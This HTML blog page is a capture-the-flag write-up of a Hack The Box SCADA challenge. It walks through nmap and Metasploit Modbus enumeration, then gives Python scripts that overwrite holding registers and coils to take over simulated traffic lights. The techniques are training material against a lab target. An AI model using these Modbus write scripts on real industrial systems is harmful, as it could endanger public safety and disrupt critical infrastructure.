@@ -1,0 +1,626 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Light the was a challenge with a medium difficulty level that tested a person’s knowledge of the SCADA system. Before starting this challenge, I was clueless about this system. I learned a lot through this challenge, and I hope I can share some knowledge with you.
+ 
+SCADA Supervisory control and data acquisition is a system that allows industrial organizations to:
+* Conrtol processes * Monitor * Interact with devices * Record events  For more information on SCADA'><title>HTB UNI CTF : Light The Way</title>
+
+<link rel='canonical' href='/p/htb-uni-ctf-light-the-way/'>
+
+<link rel="stylesheet" href="/scss/style.min.63c512f9679a4af0b0a047e206183b4ca51e14499deb80ad27e2fcc1419df316.css"><meta property='og:title' content='HTB UNI CTF : Light The Way'>
+<meta property='og:description' content='Light the was a challenge with a medium difficulty level that tested a person’s knowledge of the SCADA system. Before starting this challenge, I was clueless about this system. I learned a lot through this challenge, and I hope I can share some knowledge with you.
+ 
+SCADA Supervisory control and data acquisition is a system that allows industrial organizations to:
+* Conrtol processes * Monitor * Interact with devices * Record events  For more information on SCADA'>
+<meta property='og:url' content='/p/htb-uni-ctf-light-the-way/'>
+<meta property='og:site_name' content='Yojan&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Hack The Box' /><meta property='article:published_time' content='2021-11-21T23:22:26-05:00'/><meta property='article:modified_time' content='2021-11-21T23:22:26-05:00'/><meta property='og:image' content='/hackthebox/unictf.png' />
+<meta name="twitter:site" content="@https://twitter.com/GautamYojan">
+    <meta name="twitter:creator" content="@https://twitter.com/GautamYojan"><meta name="twitter:title" content="HTB UNI CTF : Light The Way">
+<meta name="twitter:description" content="Light the was a challenge with a medium difficulty level that tested a person’s knowledge of the SCADA system. Before starting this challenge, I was clueless about this system. I learned a lot through this challenge, and I hope I can share some knowledge with you.
+ 
+SCADA Supervisory control and data acquisition is a system that allows industrial organizations to:
+* Conrtol processes * Monitor * Interact with devices * Record events  For more information on SCADA"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='/hackthebox/unictf.png' />
+    </head>
+    <body class="
+    article-page has-toc
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "dark");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    
+        extended
+    
+">
+    
+        <div id="article-toolbar">
+            <a href="/" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+                <span>Back</span>
+            </a>
+        </div>
+    
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/htb-uni-ctf-light-the-way/">
+                
+                    <img src="/hackthebox/unictf.png" loading="lazy" alt="Featured image of post HTB UNI CTF : Light The Way" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+
+    <h2 class="article-title">
+        <a href="/p/htb-uni-ctf-light-the-way/">HTB UNI CTF : Light The Way</a>
+    </h2>
+
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Nov 21, 2021</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    7 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    <p>Light the was a challenge with a medium difficulty level that tested a person’s knowledge of the SCADA system. Before starting this challenge, I was clueless about this system. I learned a lot through this challenge, and I hope I can share some knowledge with you.</p>
+<p><figure 
+	>
+	<a href="/lighttheway/question.png" >
+		<img src="/lighttheway/question.png"
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h2 id="scada">SCADA</h2>
+<p>Supervisory control and data acquisition is a system that allows industrial organizations to:</p>
+<pre><code>* Conrtol processes
+* Monitor
+* Interact with devices
+* Record events
+</code></pre>
+<p><a class="link" href="https://inductiveautomation.com/resources/article/what-is-scada"  target="_blank" rel="noopener"
+    >For more information on SCADA</a></p>
+<h2 id="starting-point">Starting Point</h2>
+<p>For this specific challenge, we needed to compromise traffic lights. There wasn&rsquo;t much information to work with, given only the IP address of the system. It was also in the same network, which makes things easier.</p>
+<p><figure 
+	>
+	<a href="/lighttheway/HMI.png" >
+		<img src="/lighttheway/HMI.png"
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>The given IP was : <code>10.129.96.95</code></p>
+<p>A website and the IP was all the information that I had. So, where did I begin?</p>
+<h2 id="nmap">Nmap</h2>
+<p>Yep, nmap. It allows us to scan the system and find information on it.</p>
+<pre tabindex="0"><code>nmap -p- 10.129.96.95 -sCV
+</code></pre><p><figure 
+	>
+	<a href="/lighttheway/nmap.png" >
+		<img src="/lighttheway/nmap.png"
+			
+			
+			
+			loading="lazy"
+			alt="test">
+	</a>
+	
+	<figcaption>test</figcaption>
+	
+</figure></p>
+<p>Key Points:</p>
+<pre><code>* PORT 22 : used for SSH, I wouldn't even try to attack it
+* PORT 80 : running nginx server for the front end
+* PORT 502: This is the interesting port. (I didn't knew it was interesting until I googled and found out that modbus uses it)
+</code></pre>
+<p>After figuring those stuff out, now&rsquo;s the time to enumerate more information on the Modbus.</p>
+<pre tabindex="0"><code>nmap -p 502 --script modbus-discover 10.129.96.95
+</code></pre><p><figure 
+	>
+	<a href="/lighttheway/nmap2.png" >
+		<img src="/lighttheway/nmap2.png"
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>Didn&rsquo;t give much but it confirms that Modbus is running on port 502.</p>
+<h3 id="more-info">More info!</h3>
+<p><figure 
+	>
+	<a href="https://c.tenor.com/ayUs509YzsIAAAAC/kid-bored.gif" >
+		<img src="https://c.tenor.com/ayUs509YzsIAAAAC/kid-bored.gif"
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>What I have here isn&rsquo;t enough to make the exploit. So, what should I do?</p>
+<p>Turning back to my good old friend, internet I found a metaspolit script <code>auxiliary/scanner/scada/modbus_findunitid</code></p>
+<p>Using the script, I was able to figure out that there are more than one unit in the given SCADA system. I didn&rsquo;t let the script complete, but there are more than 200 units.</p>
+<p><em><strong>Why are there so many?</strong></em>
+There are 6 junctions in the picture, and if there are more than 200 does each unit control one light?</p>
+<p>Before answerinng that question let&rsquo;s first look at what data the first unit has.</p>
+<h2 id="get-data">Get DATA</h2>
+<p>Let&rsquo;s search if there&rsquo;s any more metaspolit script that we can use.</p>
+<pre tabindex="0"><code>msf6&gt; search modbus
+</code></pre><p>After searching for modbus, I found 6 modules/scripts</p>
+<pre tabindex="0"><code>Matching Modules
+================
+
+   #  Name                                            Disclosure Date  Rank    Check  Description
+   -  ----                                            ---------------  ----    -----  -----------
+   0  auxiliary/analyze/modbus_zip                                     normal  No     Extract zip from Modbus communication
+   1  auxiliary/scanner/scada/modbus_banner_grabbing                   normal  No     Modbus Banner Grabbing
+   2  auxiliary/scanner/scada/modbusclient                             normal  No     Modbus Client Utility
+   3  auxiliary/scanner/scada/modbus_findunitid       2012-10-28       normal  No     Modbus Unit ID and Station ID Enumerator
+   4  auxiliary/scanner/scada/modbusdetect            2011-11-01       normal  No     Modbus Version Scanner
+   5  auxiliary/admin/scada/modicon_stux_transfer     2012-04-05       normal  No     Schneider Modicon Ladder Logic Upload/Download
+   6  auxiliary/admin/scada/modicon_command           2012-04-05       normal  No     Schneider Modicon Remote START/STOP Command
+</code></pre><p>Modbusclient module seems to be the most useful for this case.</p>
+<pre tabindex="0"><code>msf6&gt; use auxiliary/scanner/scada/modbusclient
+msf6 auxiliary(scanner/scada/modbusclient)&gt; show options
+</code></pre><p><figure 
+	>
+	<a href="/lighttheway/meta1.png" >
+		<img src="/lighttheway/meta1.png"
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>So the RHOST for this  instance will be the IP address : <code>10.129.96.95</code></p>
+<pre tabindex="0"><code>set RHOST 10.129.96.95
+</code></pre><p>We need to set where we want to start reading the DATA from to do that we need wo set the DATA_ADDRESS field</p>
+<pre tabindex="0"><code>set DATA_ADDRESS 0
+</code></pre><p>Then we need to set how many DATA_ADDRESS we want to read.</p>
+<pre tabindex="0"><code>set NUMBER 18
+</code></pre><p><figure 
+	>
+	<a href="/lighttheway/meta2.png" >
+		<img src="/lighttheway/meta2.png"
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>Let&rsquo;s see what those numbers mean.</p>
+<p>This small python command takes the arr of int and converts to a string.</p>
+<pre tabindex="0"><code>arr = [97, 117, 116, 111, 95, 109, 111, 100, 101, 58, 116, 114, 117, 101]
+
+print(&#34;&#34;.join(chr(x) for x in arr))
+</code></pre><p>With the python script I was able to get a string: <code>auto_mode:true</code></p>
+<h2 id="setting-it-to-manual">Setting it to manual</h2>
+<p>If I remember correctly the description of the challenge wants us to set it to manual mode. Which means we need to set the auto_mode to false.</p>
+<pre tabindex="0"><code>print([ord(x) for x in &#34;auto_mode:false&#34;])
+</code></pre><p>Used this python script to get the numbers that we need to send in order to set the SCADA system to false.</p>
+<pre tabindex="0"><code>[97, 117, 116, 111, 95, 109, 111, 100, 101, 58, 102, 97, 108, 115, 101]
+</code></pre><p>I wrote a simple python script that uses the Perl Modbus library to write to the holding registry.
+<figure 
+	>
+	<a href="https://c.tenor.com/zOAWdshu_I0AAAAd/boring-unimpressed.gif" >
+		<img src="https://c.tenor.com/zOAWdshu_I0AAAAd/boring-unimpressed.gif"
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>Yea, I later figured out that python had a library to connect to modbus, but anyways it works.</p>
+<pre tabindex="0"><code>import subprocess
+
+for i in range(1,20):                           #  :  f   a   l   s   e
+    cmd = f&#34;modbus write -w -s {i} 10.129.96.95 10 58 102 97 108 115 101&#34;
+    subprocess.run(cmd.split(&#34; &#34;))
+</code></pre><p><code>modbus {command} {type} {slaveid} {target_ip} {data_address} {information_to_write}</code></p>
+<p>I set it to the first 20 to see if that would make any difference. It didn&rsquo;t make any visual difference. But if I look at the registers again, it changed the values.</p>
+<p><figure 
+	>
+	<a href="/lighttheway/meta3.png" >
+		<img src="/lighttheway/meta3.png"
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure>
+<em>First one is before running the script, second one is after running the python script.</em></p>
+<p>So, if that didn&rsquo;t change anything, what can I do?</p>
+<p>Coils also store values, and I can read and write it.</p>
+<h2 id="reading-coils">Reading Coils</h2>
+<pre tabindex="0"><code>msf6 auxiliary(scanner/scada/modbusclient)&gt; set action READ_COILS
+</code></pre><p>Reading the first 18 coils, it was all just bunch of 0s so I decided to read 2000 of them to see if I find anything good.</p>
+<pre tabindex="0"><code>msf6 auxiliary(scanner/scada/modbusclient)&gt; set NUMBER 2000
+</code></pre><p><figure 
+	>
+	<a href="/lighttheway/meta4.png" >
+		<img src="/lighttheway/meta4.png"
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>After trying to get 2000 coils, I can see some interesting information. There are bunch of 1 in the middle.</p>
+<p>Let&rsquo;s see what other Units have.</p>
+<pre tabindex="0"><code>msf6 auxiliary(scanner/scada/modbusclient)&gt; set UNIT_NUMBER 2
+</code></pre><p>UNIT_NUMBER determines which slave node we are viewing.</p>
+<p>After looking through 7 to 8 of them I found out that only 6 of it hold any valuable data. So, I concluded that each unit represents one junction.</p>
+<pre tabindex="0"><code>from pyModbusTCP.client import ModbusClient
+
+data_address = {}
+
+for i in range(1,7):
+    c = ModbusClient(host=&#34;10.129.96.95&#34;, port=&#34;502&#34;, unit_id=i, auto_open=True)
+
+    regs = c.read_coils(0,2000)
+
+    data_address[i] = regs.index(True)
+
+print(data_address)
+</code></pre><p>I wrote this script to get the DATA_ADDRESS of all the 1/True places.</p>
+<pre tabindex="0"><code>{1: 571, 2: 1921, 3: 531, 4: 1267, 5: 925, 6: 888}
+</code></pre><h1 id="the-exploit">The exploit?</h1>
+<p>Now I have all the necessary information on the data address of where they are reading the traffic data from, I can create a payload to change the traffic lights.</p>
+<p>The first three bits represents the North side of the light, and goes in order of</p>
+<p>Green Yellow Red</p>
+<p>IF we curl the api <code>http://10.129.96.95/api</code> we can see value for all the colors and the direction.</p>
+<p><figure 
+	>
+	<a href="/lighttheway/curl.png" >
+		<img src="/lighttheway/curl.png"
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>After doing some digging I found out that the API doesn&rsquo;t represent the data in the same way the registers stores the data.</p>
+<p>In the registers we need to pass in data as follow:</p>
+<pre tabindex="0"><code>NG NY NR EG EY ER SG SY SR WG WY WR
+</code></pre><p><figure 
+	>
+	<a href="/lighttheway/lights.png" >
+		<img src="/lighttheway/lights.png"
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>Looking at the picture we need to change the west side to green because the car is about to turn towards west for the first junction, and we have to turn the East side to Green for the 2nd and 4th junction, and finally the north side for 6th junction.</p>
+<p>So the values for junction one are as follow:</p>
+<pre tabindex="0"><code>[False, False, True, False, False, True, False, False, True, True, False, False]
+</code></pre><p>This will turn on the green light on the west.</p>
+<pre tabindex="0"><code>[False, False, True, False, False, True, False, False, True, False, False, True]
+</code></pre><p>So, What I was saying about the direction didn&rsquo;t make any sense, I had to play around for a long time before I figured out the correct light to turn on. The placement of the lights didn&rsquo;t sense to me, it might be becuase the difference in driving in different country.</p>
+<p>The following script did the job.</p>
+<pre tabindex="0"><code>from pyModbusTCP.client import ModbusClient
+
+data_address = {}
+
+c = ModbusClient(host=&#34;10.129.96.95&#34;, port=&#34;502&#34;, unit_id=1, auto_open=True)
+for i in range(1,7):
+    c.unit_id(i)
+    regs = c.read_coils(0,2000)
+
+    data_address[i] = regs.index(True)
+
+c.unit_id(1)
+c.write_multiple_coils(571,[False, False, True, False, False, True, False, False, True, True, False, False])
+
+c.unit_id(2)
+c.write_multiple_coils(1920, [True, False, False, False, False, True,False, False, True, False, False, True])
+
+
+c.unit_id(4)
+c.write_multiple_coils(1266, [False, False, True, False, False, True,False, False, True, True, False, False])
+
+
+c.unit_id(6)
+c.write_multiple_coils(886,[False, False, True, False, False, True, False, False, True, True, False, False])
+</code></pre><p>After running the script, the car moved and I found the flag.</p>
+<p><figure 
+	>
+	<a href="/lighttheway/lighttheway.gif" >
+		<img src="/lighttheway/lighttheway.gif"
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>Flag:<code>HTB{w3_se3_tH3_l1ght}</code></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/hack-the-box/">Hack The Box</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    <aside class="related-contents--wrapper">
+    
+    
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2022 Yojan&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.6.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+        <aside class="sidebar right-sidebar sticky">
+            <section class="widget archives">
+                <div class="widget-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                </div>
+                <h2 class="widget-title section-title">Table of contents</h2>
+                
+                <div class="widget--toc">
+                    <nav id="TableOfContents">
+  <ol>
+    <li><a href="#scada">SCADA</a></li>
+    <li><a href="#starting-point">Starting Point</a></li>
+    <li><a href="#nmap">Nmap</a>
+      <ol>
+        <li><a href="#more-info">More info!</a></li>
+      </ol>
+    </li>
+    <li><a href="#get-data">Get DATA</a></li>
+    <li><a href="#setting-it-to-manual">Setting it to manual</a></li>
+    <li><a href="#reading-coils">Reading Coils</a></li>
+  </ol>
+</nav>
+                </div>
+            </section>
+        </aside>
+    
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
